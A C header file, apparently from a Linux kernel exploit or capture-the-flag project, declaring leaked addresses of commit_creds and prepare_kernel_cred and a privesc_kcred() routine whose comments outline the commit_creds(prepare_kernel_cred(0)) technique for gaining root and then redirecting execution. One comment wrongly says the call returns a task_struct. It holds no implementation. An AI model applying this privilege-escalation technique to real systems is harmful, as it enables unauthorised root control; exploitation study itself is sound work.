#ifndef PRIVESC_H
#define PRIVESC_H

#include <stdint.h>
#include <stddef.h>

extern uintptr_t post_privesc_jmp_addr;

/* ============= 1 =============
 * Privesc from kernel creds:
 *      commit_creds(prepare_kernel_cred(0));
 * */

 /* First leak the address of these 2 kernel APIs */
extern uintptr_t commit_creds_addr;
extern uintptr_t prepare_kernel_cred_addr;

/* Commit the creds 0 to become root
 * This returns a task_struct of a privileged context
 *
 * After this, we will need to provide a next jump
 *      to take control of the following move, as root
 * */ 
void privesc_kcred(void);

#endif  // PRIVESC_H
